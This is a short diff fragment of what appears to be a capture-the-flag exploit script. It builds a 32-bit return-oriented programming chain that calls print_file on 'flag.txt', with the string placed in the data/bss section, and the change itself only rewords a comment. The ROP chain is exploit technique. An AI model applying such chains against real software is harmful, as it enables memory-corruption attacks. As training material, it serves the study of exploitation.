@@ -31,7 +31,7 @@ rop += p32(mov_ptr_edi_ebp)
 #rop += p32(0) # "\0\0\0\0"
 #rop += p32(mov_ptr_edi_ebp)
 
-# Returnin to print_file
+# Return to print_file("flag.txt") (string stored in data/bss section)
 rop += p32(ELF.symbols['print_file'])
 rop += p32(pop2ret)
 rop += p32(data_adr)
